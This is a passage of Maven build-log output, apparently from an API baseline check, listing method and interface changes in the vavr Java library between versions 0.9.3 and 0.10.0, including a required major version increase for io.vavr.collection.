io.vavr.collection.List\n[INFO]      + class io.vavr.API$For7Option\n[INFO]          + access static\n[INFO]          + method clone()\n[INFO]              + access protected\n[INFO]              + return java.lang.Object\n[INFO]          + method equals(java.lang.Object)\n[INFO]              + return boolean\n[INFO]          + method finalize()\n[INFO]              + access protected\n[INFO]              + return void\n[INFO]          + method hashCode()\n[INFO]              + return int\n[INFO]          + method toString()\n[INFO]              + return java.lang.String\n[INFO]          + method yield(io.vavr.Function7)\n[INFO]              + return io.vavr.control.Option\n[INFO]      + class io.vavr.API$For7Try\n[INFO]          + access static\n[INFO]          + method clone()\n[INFO]              + access protected\n[INFO]              + return java.lang.Object\n[INFO]          + method equals(java.lang.Object)\n[INFO]              + return boolean\n[INFO]          + method finalize()\n[INFO]              + access protected\n[INFO]              + return void\n[INFO]          + method hashCode()\n[INFO]              + return int\n[INFO]          + method toString()\n[INFO]              + return java.lang.String\n[INFO]          + method yield(io.vavr.Function7)\n[INFO]              + return io.vavr.control.Try\n[INFO]      + class io.vavr.API$For8Future\n[INFO]          + access static\n[INFO]          + method clone()\n[INFO]              + access protected\n[INFO]              + return java.lang.Object\n[INFO]          + method equals(java.lang.Object)\n[INFO]              + return boolean\n[INFO]          + method finalize()\n[INFO]              + access protected\n[INFO]              + return void\n[INFO]          + method hashCode()\n[INFO]              + return int\n[INFO]          + method toString()\n[INFO]              + return java.lang.String\n[INFO]          + method yield(io.vavr.Function8)\n[INFO]              + return io.vavr.concurrent.Future\n[INFO]      + class io.vavr.API$For8List\n[INFO]          + access static\n[INFO]          + method clone()\n[INFO]              + access protected\n[INFO]              + return java.lang.Object\n[INFO]          + method equals(java.lang.Object)\n[INFO]              + return boolean\n[INFO]          + method finalize()\n[INFO]              + access protected\n[INFO]              + return void\n[INFO]          + method hashCode()\n[INFO]              + return int\n[INFO]          + method toString()\n[INFO]              + return java.lang.String\n[INFO]          + method yield(io.vavr.Function8)\n[INFO]              + return io.vavr.collection.List\n[INFO]      + class io.vavr.API$For8Option\n[INFO]          + access static\n[INFO]          + method clone()\n[INFO]              + access protected\n[INFO]              + return java.lang.Object\n[INFO]          + method equals(java.lang.Object)\n[INFO]              + return boolean\n[INFO]          + method finalize()\n[INFO]              + access protected\n[INFO]              + return void\n[INFO]          + method hashCode()\n[INFO]              + return int\n[INFO]          + method toString()\n[INFO]              + return java.lang.String\n[INFO]          + method yield(io.vavr.Function8)\n[INFO]              + return io.vavr.control.Option\n[INFO]      + class io.vavr.API$For8Try\n[INFO]          + access static\n[INFO]          + method clone()\n[INFO]              + access protected\n[INFO]              + return java.lang.Object\n[INFO]          + method equals(java.lang.Object)\n[INFO]              + return boolean\n[INFO]          + method finalize()\n[INFO]              + access protected\n[INFO]              + return void\n[INFO]          + method hashCode()\n[INFO]              + return int\n[INFO]          + method toString()\n[INFO]              + return java.lang.String\n[INFO]          + method yield(io.vavr.Function8)\n[INFO]              + return io.vavr.control.Try\n[INFO]      < class io.vavr.API$Match$Pattern0\n[INFO]          + implements io.vavr.Function1\n[INFO]          + implements java.io.Serializable\n[INFO]          + implements java.util.function.Function\n[INFO]          + method ()\n[INFO]              + return void\n[INFO]          + method andThen(java.util.function.Function)\n[INFO]              + return io.vavr.Function1\n[INFO]          + method arity()\n[INFO]              + return int\n[INFO]          + method compose(java.util.function.Function)\n[INFO]              + return io.vavr.Function1\n[INFO]          + method curried()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method isMemoized()\n[INFO]              + return boolean\n[INFO]          + method lift()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method memoized()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method partial(java.util.function.Predicate)\n[INFO]              + return io.vavr.PartialFunction\n[INFO]          + method reversed()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method tupled()\n[INFO]              + return io.vavr.Function1\n[INFO]      < class io.vavr.API$Match$Pattern1\n[INFO]          + implements io.vavr.Function1\n[INFO]          + implements java.io.Serializable\n[INFO]          + implements java.util.function.Function\n[INFO]          + method andThen(java.util.function.Function)\n[INFO]              + return io.vavr.Function1\n[INFO]          + method arity()\n[INFO]              + return int\n[INFO]          + method compose(java.util.function.Function)\n[INFO]              + return io.vavr.Function1\n[INFO]          + method curried()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method isMemoized()\n[INFO]              + return boolean\n[INFO]          + method lift()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method memoized()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method partial(java.util.function.Predicate)\n[INFO]              + return io.vavr.PartialFunction\n[INFO]          + method reversed()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method tupled()\n[INFO]              + return io.vavr.Function1\n[INFO]      < class io.vavr.API$Match$Pattern2\n[INFO]          + implements io.vavr.Function1\n[INFO]          + implements java.io.Serializable\n[INFO]          + implements java.util.function.Function\n[INFO]          + method andThen(java.util.function.Function)\n[INFO]              + return io.vavr.Function1\n[INFO]          + method arity()\n[INFO]              + return int\n[INFO]          + method compose(java.util.function.Function)\n[INFO]              + return io.vavr.Function1\n[INFO]          + method curried()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method isMemoized()\n[INFO]              + return boolean\n[INFO]          + method lift()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method memoized()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method partial(java.util.function.Predicate)\n[INFO]              + return io.vavr.PartialFunction\n[INFO]          + method reversed()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method tupled()\n[INFO]              + return io.vavr.Function1\n[INFO]      < class io.vavr.API$Match$Pattern3\n[INFO]          + implements io.vavr.Function1\n[INFO]          + implements java.io.Serializable\n[INFO]          + implements java.util.function.Function\n[INFO]          + method andThen(java.util.function.Function)\n[INFO]              + return io.vavr.Function1\n[INFO]          + method arity()\n[INFO]              + return int\n[INFO]          + method compose(java.util.function.Function)\n[INFO]              + return io.vavr.Function1\n[INFO]          + method curried()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method isMemoized()\n[INFO]              + return boolean\n[INFO]          + method lift()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method memoized()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method partial(java.util.function.Predicate)\n[INFO]              + return io.vavr.PartialFunction\n[INFO]          + method reversed()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method tupled()\n[INFO]              + return io.vavr.Function1\n[INFO]      < class io.vavr.API$Match$Pattern4\n[INFO]          + implements io.vavr.Function1\n[INFO]          + implements java.io.Serializable\n[INFO]          + implements java.util.function.Function\n[INFO]          + method andThen(java.util.function.Function)\n[INFO]              + return io.vavr.Function1\n[INFO]          + method arity()\n[INFO]              + return int\n[INFO]          + method compose(java.util.function.Function)\n[INFO]              + return io.vavr.Function1\n[INFO]          + method curried()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method isMemoized()\n[INFO]              + return boolean\n[INFO]          + method lift()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method memoized()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method partial(java.util.function.Predicate)\n[INFO]              + return io.vavr.PartialFunction\n[INFO]          + method reversed()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method tupled()\n[INFO]              + return io.vavr.Function1\n[INFO]      < class io.vavr.API$Match$Pattern5\n[INFO]          + implements io.vavr.Function1\n[INFO]          + implements java.io.Serializable\n[INFO]          + implements java.util.function.Function\n[INFO]          + method andThen(java.util.function.Function)\n[INFO]              + return io.vavr.Function1\n[INFO]          + method arity()\n[INFO]              + return int\n[INFO]          + method compose(java.util.function.Function)\n[INFO]              + return io.vavr.Function1\n[INFO]          + method curried()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method isMemoized()\n[INFO]              + return boolean\n[INFO]          + method lift()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method memoized()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method partial(java.util.function.Predicate)\n[INFO]              + return io.vavr.PartialFunction\n[INFO]          + method reversed()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method tupled()\n[INFO]              + return io.vavr.Function1\n[INFO]      < class io.vavr.API$Match$Pattern6\n[INFO]          + implements io.vavr.Function1\n[INFO]          + implements java.io.Serializable\n[INFO]          + implements java.util.function.Function\n[INFO]          + method andThen(java.util.function.Function)\n[INFO]              + return io.vavr.Function1\n[INFO]          + method arity()\n[INFO]              + return int\n[INFO]          + method compose(java.util.function.Function)\n[INFO]              + return io.vavr.Function1\n[INFO]          + method curried()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method isMemoized()\n[INFO]              + return boolean\n[INFO]          + method lift()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method memoized()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method partial(java.util.function.Predicate)\n[INFO]              + return io.vavr.PartialFunction\n[INFO]          + method reversed()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method tupled()\n[INFO]              + return io.vavr.Function1\n[INFO]      < class io.vavr.API$Match$Pattern7\n[INFO]          + implements io.vavr.Function1\n[INFO]          + implements java.io.Serializable\n[INFO]          + implements java.util.function.Function\n[INFO]          + method andThen(java.util.function.Function)\n[INFO]              + return io.vavr.Function1\n[INFO]          + method arity()\n[INFO]              + return int\n[INFO]          + method compose(java.util.function.Function)\n[INFO]              + return io.vavr.Function1\n[INFO]          + method curried()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method isMemoized()\n[INFO]              + return boolean\n[INFO]          + method lift()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method memoized()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method partial(java.util.function.Predicate)\n[INFO]              + return io.vavr.PartialFunction\n[INFO]          + method reversed()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method tupled()\n[INFO]              + return io.vavr.Function1\n[INFO]      < class io.vavr.API$Match$Pattern8\n[INFO]          + implements io.vavr.Function1\n[INFO]          + implements java.io.Serializable\n[INFO]          + implements java.util.function.Function\n[INFO]          + method andThen(java.util.function.Function)\n[INFO]              + return io.vavr.Function1\n[INFO]          + method arity()\n[INFO]              + return int\n[INFO]          + method compose(java.util.function.Function)\n[INFO]              + return io.vavr.Function1\n[INFO]          + method curried()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method isMemoized()\n[INFO]              + return boolean\n[INFO]          + method lift()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method memoized()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method partial(java.util.function.Predicate)\n[INFO]              + return io.vavr.PartialFunction\n[INFO]          + method reversed()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method tupled()\n[INFO]              + return io.vavr.Function1\n[INFO]      < class io.vavr.Predicates\n[INFO]          + method not(java.util.function.Predicate)\n[INFO]              + access static\n[INFO]              + return java.util.function.Predicate\n[INFO]      < class io.vavr.Tuple0\n[INFO]          + method append(java.lang.Object)\n[INFO]              + return io.vavr.Tuple1\n[INFO]          + method concat(io.vavr.Tuple1)\n[INFO]              + return io.vavr.Tuple1\n[INFO]          + method concat(io.vavr.Tuple2)\n[INFO]              + return io.vavr.Tuple2\n[INFO]          + method concat(io.vavr.Tuple3)\n[INFO]              + return io.vavr.Tuple3\n[INFO]          + method concat(io.vavr.Tuple4)\n[INFO]              + return io.vavr.Tuple4\n[INFO]          + method concat(io.vavr.Tuple5)\n[INFO]              + return io.vavr.Tuple5\n[INFO]          + method concat(io.vavr.Tuple6)\n[INFO]              + return io.vavr.Tuple6\n[INFO]          + method concat(io.vavr.Tuple7)\n[INFO]              + return io.vavr.Tuple7\n[INFO]          + method concat(io.vavr.Tuple8)\n[INFO]              + return io.vavr.Tuple8\n[INFO]      < class io.vavr.Tuple1\n[INFO]          + method append(java.lang.Object)\n[INFO]              + return io.vavr.Tuple2\n[INFO]          + method concat(io.vavr.Tuple1)\n[INFO]              + return io.vavr.Tuple2\n[INFO]          + method concat(io.vavr.Tuple2)\n[INFO]              + return io.vavr.Tuple3\n[INFO]          + method concat(io.vavr.Tuple3)\n[INFO]              + return io.vavr.Tuple4\n[INFO]          + method concat(io.vavr.Tuple4)\n[INFO]              + return io.vavr.Tuple5\n[INFO]          + method concat(io.vavr.Tuple5)\n[INFO]              + return io.vavr.Tuple6\n[INFO]          + method concat(io.vavr.Tuple6)\n[INFO]              + return io.vavr.Tuple7\n[INFO]          + method concat(io.vavr.Tuple7)\n[INFO]              + return io.vavr.Tuple8\n[INFO]      < class io.vavr.Tuple2\n[INFO]          + method append(java.lang.Object)\n[INFO]              + return io.vavr.Tuple3\n[INFO]          + method concat(io.vavr.Tuple1)\n[INFO]              + return io.vavr.Tuple3\n[INFO]          + method concat(io.vavr.Tuple2)\n[INFO]              + return io.vavr.Tuple4\n[INFO]          + method concat(io.vavr.Tuple3)\n[INFO]              + return io.vavr.Tuple5\n[INFO]          + method concat(io.vavr.Tuple4)\n[INFO]              + return io.vavr.Tuple6\n[INFO]          + method concat(io.vavr.Tuple5)\n[INFO]              + return io.vavr.Tuple7\n[INFO]          + method concat(io.vavr.Tuple6)\n[INFO]              + return io.vavr.Tuple8\n[INFO]      < class io.vavr.Tuple3\n[INFO]          + method append(java.lang.Object)\n[INFO]              + return io.vavr.Tuple4\n[INFO]          + method concat(io.vavr.Tuple1)\n[INFO]              + return io.vavr.Tuple4\n[INFO]          + method concat(io.vavr.Tuple2)\n[INFO]              + return io.vavr.Tuple5\n[INFO]          + method concat(io.vavr.Tuple3)\n[INFO]              + return io.vavr.Tuple6\n[INFO]          + method concat(io.vavr.Tuple4)\n[INFO]              + return io.vavr.Tuple7\n[INFO]          + method concat(io.vavr.Tuple5)\n[INFO]              + return io.vavr.Tuple8\n[INFO]      < class io.vavr.Tuple4\n[INFO]          + method append(java.lang.Object)\n[INFO]              + return io.vavr.Tuple5\n[INFO]          + method concat(io.vavr.Tuple1)\n[INFO]              + return io.vavr.Tuple5\n[INFO]          + method concat(io.vavr.Tuple2)\n[INFO]              + return io.vavr.Tuple6\n[INFO]          + method concat(io.vavr.Tuple3)\n[INFO]              + return io.vavr.Tuple7\n[INFO]          + method concat(io.vavr.Tuple4)\n[INFO]              + return io.vavr.Tuple8\n[INFO]      < class io.vavr.Tuple5\n[INFO]          + method append(java.lang.Object)\n[INFO]              + return io.vavr.Tuple6\n[INFO]          + method concat(io.vavr.Tuple1)\n[INFO]              + return io.vavr.Tuple6\n[INFO]          + method concat(io.vavr.Tuple2)\n[INFO]              + return io.vavr.Tuple7\n[INFO]          + method concat(io.vavr.Tuple3)\n[INFO]              + return io.vavr.Tuple8\n[INFO]      < class io.vavr.Tuple6\n[INFO]          + method append(java.lang.Object)\n[INFO]              + return io.vavr.Tuple7\n[INFO]          + method concat(io.vavr.Tuple1)\n[INFO]              + return io.vavr.Tuple7\n[INFO]          + method concat(io.vavr.Tuple2)\n[INFO]              + return io.vavr.Tuple8\n[INFO]      < class io.vavr.Tuple7\n[INFO]          + method append(java.lang.Object)\n[INFO]              + return io.vavr.Tuple8\n[INFO]          + method concat(io.vavr.Tuple1)\n[INFO]              + return io.vavr.Tuple8\n[INFO]      < interface io.vavr.API$Match$Case\n[INFO]          + implements io.vavr.Function1\n[INFO]          + implements java.io.Serializable\n[INFO]          + implements java.util.function.Function\n[INFO]          + field serialVersionUID\n[INFO]              + access final\n[INFO]              + access static\n[INFO]              + constant 1\n[INFO]              + return long\n[INFO]          + method andThen(java.util.function.Function)\n[INFO]              + return io.vavr.Function1\n[INFO]          + method arity()\n[INFO]              + return int\n[INFO]          + method compose(java.util.function.Function)\n[INFO]              + return io.vavr.Function1\n[INFO]          + method curried()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method isMemoized()\n[INFO]              + return boolean\n[INFO]          + method lift()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method memoized()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method partial(java.util.function.Predicate)\n[INFO]              + return io.vavr.PartialFunction\n[INFO]          + method reversed()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method tupled()\n[INFO]              + return io.vavr.Function1\n[INFO]      < interface io.vavr.API$Match$Pattern\n[INFO]          + implements io.vavr.Function1\n[INFO]          + implements java.io.Serializable\n[INFO]          + implements java.util.function.Function\n[INFO]          + method andThen(java.util.function.Function)\n[INFO]              + return io.vavr.Function1\n[INFO]          + method arity()\n[INFO]              + return int\n[INFO]          + method compose(java.util.function.Function)\n[INFO]              + return io.vavr.Function1\n[INFO]          + method curried()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method isMemoized()\n[INFO]              + return boolean\n[INFO]          + method lift()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method memoized()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method partial(java.util.function.Predicate)\n[INFO]              + return io.vavr.PartialFunction\n[INFO]          + method reversed()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method tupled()\n[INFO]              + return io.vavr.Function1\n[INFO]      < interface io.vavr.CheckedConsumer\n[INFO]          + method andThen(io.vavr.CheckedConsumer)\n[INFO]              + return io.vavr.CheckedConsumer\n[INFO]          + method of(io.vavr.CheckedConsumer)\n[INFO]              + access static\n[INFO]              + return io.vavr.CheckedConsumer\n[INFO]          + method unchecked()\n[INFO]              + return java.util.function.Consumer\n[INFO]      > interface io.vavr.CheckedFunction0\n[INFO]          - implements io.vavr.Lambda\n[INFO]      > interface io.vavr.CheckedFunction1\n[INFO]          - implements io.vavr.Lambda\n[INFO]      > interface io.vavr.CheckedFunction2\n[INFO]          - implements io.vavr.Lambda\n[INFO]      > interface io.vavr.CheckedFunction3\n[INFO]          - implements io.vavr.Lambda\n[INFO]      > interface io.vavr.CheckedFunction4\n[INFO]          - implements io.vavr.Lambda\n[INFO]      > interface io.vavr.CheckedFunction5\n[INFO]          - implements io.vavr.Lambda\n[INFO]      > interface io.vavr.CheckedFunction6\n[INFO]          - implements io.vavr.Lambda\n[INFO]      > interface io.vavr.CheckedFunction7\n[INFO]          - implements io.vavr.Lambda\n[INFO]      > interface io.vavr.CheckedFunction8\n[INFO]          - implements io.vavr.Lambda\n[INFO]      < interface io.vavr.CheckedPredicate\n[INFO]          + method of(io.vavr.CheckedPredicate)\n[INFO]              + access static\n[INFO]              + return io.vavr.CheckedPredicate\n[INFO]          + method unchecked()\n[INFO]              + return java.util.function.Predicate\n[INFO]      < interface io.vavr.CheckedRunnable\n[INFO]          + method of(io.vavr.CheckedRunnable)\n[INFO]              + access static\n[INFO]              + return io.vavr.CheckedRunnable\n[INFO]          + method unchecked()\n[INFO]              + return java.lang.Runnable\n[INFO]      > interface io.vavr.Function0\n[INFO]          - implements io.vavr.Lambda\n[INFO]      > interface io.vavr.Function1\n[INFO]          - implements io.vavr.Lambda\n[INFO]      > interface io.vavr.Function2\n[INFO]          - implements io.vavr.Lambda\n[INFO]      > interface io.vavr.Function3\n[INFO]          - implements io.vavr.Lambda\n[INFO]      > interface io.vavr.Function4\n[INFO]          - implements io.vavr.Lambda\n[INFO]      > interface io.vavr.Function5\n[INFO]          - implements io.vavr.Lambda\n[INFO]      > interface io.vavr.Function6\n[INFO]          - implements io.vavr.Lambda\n[INFO]      > interface io.vavr.Function7\n[INFO]          - implements io.vavr.Lambda\n[INFO]      > interface io.vavr.Function8\n[INFO]          - implements io.vavr.Lambda\n[INFO]      - interface io.vavr.Lambda$Memoized\n[INFO]          - access abstract\n[INFO]          - access static\n[INFO]          - method of(java.util.Map,io.vavr.Tuple,io.vavr.Function1)\n[INFO]              - access static\n[INFO]              - return java.lang.Object\n[INFO]      < interface io.vavr.PartialFunction\n[INFO]          + implements io.vavr.Function1\n[INFO]          + implements java.io.Serializable\n[INFO]          + implements java.util.function.Function\n[INFO]          + field serialVersionUID\n[INFO]              + access final\n[INFO]              + access static\n[INFO]              + constant 1\n[INFO]              + return long\n[INFO]          + method andThen(java.util.function.Function)\n[INFO]              + return io.vavr.Function1\n[INFO]          + method arity()\n[INFO]              + return int\n[INFO]          + method compose(java.util.function.Function)\n[INFO]              + return io.vavr.Function1\n[INFO]          + method curried()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method getIfDefined()\n[INFO]              + access static\n[INFO]              + return io.vavr.PartialFunction\n[INFO]          + method isMemoized()\n[INFO]              + return boolean\n[INFO]          + method lift()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method memoized()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method partial(java.util.function.Predicate)\n[INFO]              + return io.vavr.PartialFunction\n[INFO]          + method reversed()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method tupled()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method unlift(java.util.function.Function)\n[INFO]              + access static\n[INFO]              + return io.vavr.PartialFunction\n[INFO]      < interface io.vavr.Tuple\n[INFO]          + method hash(java.lang.Object)\n[INFO]              + access static\n[INFO]              + return int\n[INFO]          + method hash(java.lang.Object,java.lang.Object)\n[INFO]              + access static\n[INFO]              + return int\n[INFO]          + method hash(java.lang.Object,java.lang.Object,java.lang.Object)\n[INFO]              + access static\n[INFO]              + return int\n[INFO]          + method hash(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object)\n[INFO]              + access static\n[INFO]              + return int\n[INFO]          + method hash(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object)\n[INFO]              + access static\n[INFO]              + return int\n[INFO]          + method hash(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object)\n[INFO]              + access static\n[INFO]              + return int\n[INFO]          + method hash(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object)\n[INFO]              + access static\n[INFO]              + return int\n[INFO]          + method hash(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object)\n[INFO]              + access static\n[INFO]              + return int\n[INFO]      < interface io.vavr.Value\n[INFO]          + method toJavaArray(java.util.function.IntFunction)\n[INFO]              + return java.lang.Object[]\n[INFO]          + method toTree(java.util.function.Function,java.util.function.Function)\n[INFO]              + return io.vavr.collection.List\n[INFO]      + version 0.10.0\n[INFO]      - version 0.9.3\n[INFO] -----------------------------------------------------------------------------------------------------------\n[INFO] > io.vavr.collection                                 major      0.10.0     0.9.3      1.0.0      Version increase required\n[INFO]      < class io.vavr.collection.Array\n[INFO]          + method fill(int,java.lang.Object)\n[INFO]              + access static\n[INFO]              + return io.vavr.collection.Array\n[INFO]          + method reject(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.Array\n[INFO]          + method rotateLeft(int)\n[INFO]              + return io.vavr.collection.Array\n[INFO]          + method rotateRight(int)\n[INFO]              + return io.vavr.collection.Array\n[INFO]          + method takeRightUntil(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.Array\n[INFO]          + method takeRightWhile(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.Array\n[INFO]      > class io.vavr.collection.BitSetModule$AbstractBitSet\n[INFO]          - implements io.vavr.Lambda\n[INFO]          + method forEachWithIndex(java.util.function.ObjIntConsumer)\n[INFO]              + return void\n[INFO]          + method reject(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.BitSet\n[INFO]          + method toJavaArray(java.util.function.IntFunction)\n[INFO]              + return java.lang.Object[]\n[INFO]          + method toTree(java.util.function.Function,java.util.function.Function)\n[INFO]              + return io.vavr.collection.List\n[INFO]      > class io.vavr.collection.BitSetModule$BitSet1\n[INFO]          - implements io.vavr.Lambda\n[INFO]          + method forEachWithIndex(java.util.function.ObjIntConsumer)\n[INFO]              + return void\n[INFO]          + method reject(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.BitSet\n[INFO]          + method toJavaArray(java.util.function.IntFunction)\n[INFO]              + return java.lang.Object[]\n[INFO]          + method toTree(java.util.function.Function,java.util.function.Function)\n[INFO]              + return io.vavr.collection.List\n[INFO]      > class io.vavr.collection.BitSetModule$BitSet2\n[INFO]          - implements io.vavr.Lambda\n[INFO]          + method forEachWithIndex(java.util.function.ObjIntConsumer)\n[INFO]              + return void\n[INFO]          + method reject(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.BitSet\n[INFO]          + method toJavaArray(java.util.function.IntFunction)\n[INFO]              + return java.lang.Object[]\n[INFO]          + method toTree(java.util.function.Function,java.util.function.Function)\n[INFO]              + return io.vavr.collection.List\n[INFO]      < class io.vavr.collection.BitSetModule$BitSetIterator\n[INFO]          + method forEachWithIndex(java.util.function.ObjIntConsumer)\n[INFO]              + return void\n[INFO]          + method reject(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.Iterator\n[INFO]          + method toJavaArray(java.util.function.IntFunction)\n[INFO]              + return java.lang.Object[]\n[INFO]          + method toTree(java.util.function.Function,java.util.function.Function)\n[INFO]              + return io.vavr.collection.List\n[INFO]      > class io.vavr.collection.BitSetModule$BitSetN\n[INFO]          - implements io.vavr.Lambda\n[INFO]          + method forEachWithIndex(java.util.function.ObjIntConsumer)\n[INFO]              + return void\n[INFO]          + method reject(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.BitSet\n[INFO]          + method toJavaArray(java.util.function.IntFunction)\n[INFO]              + return java.lang.Object[]\n[INFO]          + method toTree(java.util.function.Function,java.util.function.Function)\n[INFO]              + return io.vavr.collection.List\n[INFO]      < class io.vavr.collection.CharSeq\n[INFO]          + method reject(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.CharSeq\n[INFO]          + method rotateLeft(int)\n[INFO]              + return io.vavr.collection.CharSeq\n[INFO]          + method rotateRight(int)\n[INFO]              + return io.vavr.collection.CharSeq\n[INFO]          + method takeRightUntil(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.CharSeq\n[INFO]          + method takeRightWhile(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.CharSeq\n[INFO]      < class io.vavr.collection.HashArrayMappedTrieModule$LeafNodeIterator\n[INFO]          + method forEachWithIndex(java.util.function.ObjIntConsumer)\n[INFO]              + return void\n[INFO]          + method reject(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.Iterator\n[INFO]          + method toJavaArray(java.util.function.IntFunction)\n[INFO]              + return java.lang.Object[]\n[INFO]          + method toTree(java.util.function.Function,java.util.function.Function)\n[INFO]              + return io.vavr.collection.List\n[INFO]      > class io.vavr.collection.HashMap\n[INFO]          + method collector(java.util.function.Function)\n[INFO]              + access static\n[INFO]              + return java.util.stream.Collector\n[INFO]          + method collector(java.util.function.Function,java.util.function.Function)\n[INFO]              + access static\n[INFO]              + return java.util.stream.Collector\n[INFO]          + method reject(java.util.function.BiPredicate)\n[INFO]              + return io.vavr.collection.HashMap\n[INFO]          + method reject(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.HashMap\n[INFO]          + method rejectKeys(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.HashMap\n[INFO]          + method rejectValues(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.HashMap\n[INFO]          > method values()\n[INFO]              - return io.vavr.collection.Seq\n[INFO]              + return io.vavr.collection.Stream\n[INFO]      > class io.vavr.collection.HashMultimap\n[INFO]          - implements io.vavr.Lambda\n[INFO]          + implements io.vavr.PartialFunction\n[INFO]          + method asMap()\n[INFO]              + return io.vavr.collection.Map\n[INFO]          + method asPartialFunction()\n[INFO]              + return io.vavr.PartialFunction\n[INFO]          + method forEachWithIndex(java.util.function.ObjIntConsumer)\n[INFO]              + return void\n[INFO]          + method isDefinedAt(java.lang.Object)\n[INFO]              + return boolean\n[INFO]          + method lift()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method reject(java.util.function.BiPredicate)\n[INFO]              + return io.vavr.collection.Multimap\n[INFO]          + method reject(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.Multimap\n[INFO]          + method rejectKeys(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.Multimap\n[INFO]          + method rejectValues(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.Multimap\n[INFO]          + method toJavaArray(java.util.function.IntFunction)\n[INFO]              + return java.lang.Object[]\n[INFO]          + method toTree(java.util.function.Function,java.util.function.Function)\n[INFO]              + return io.vavr.collection.List\n[INFO]      < class io.vavr.collection.HashMultimap$Builder\n[INFO]          + method fill(int,io.vavr.Tuple2)\n[INFO]              + return io.vavr.collection.HashMultimap\n[INFO]      < class io.vavr.collection.HashSet\n[INFO]          + method reject(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.HashSet\n[INFO]      < class io.vavr.collection.IteratorModule$CachedIterator\n[INFO]          + method forEachWithIndex(java.util.function.ObjIntConsumer)\n[INFO]              + return void\n[INFO]          + method reject(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.Iterator\n[INFO]          + method toJavaArray(java.util.function.IntFunction)\n[INFO]              + return java.lang.Object[]\n[INFO]          + method toTree(java.util.function.Function,java.util.function.Function)\n[INFO]              + return io.vavr.collection.List\n[INFO]      < class io.vavr.collection.IteratorModule$ConcatIterator\n[INFO]          + method forEachWithIndex(java.util.function.ObjIntConsumer)\n[INFO]              + return void\n[INFO]          + method reject(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.Iterator\n[INFO]          + method toJavaArray(java.util.function.IntFunction)\n[INFO]              + return java.lang.Object[]\n[INFO]          + method toTree(java.util.function.Function,java.util.function.Function)\n[INFO]              + return io.vavr.collection.List\n[INFO]      < class io.vavr.collection.IteratorModule$DistinctIterator\n[INFO]          + method forEachWithIndex(java.util.function.ObjIntConsumer)\n[INFO]              + return void\n[INFO]          + method reject(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.Iterator\n[INFO]          + method toJavaArray(java.util.function.IntFunction)\n[INFO]              + return java.lang.Object[]\n[INFO]          + method 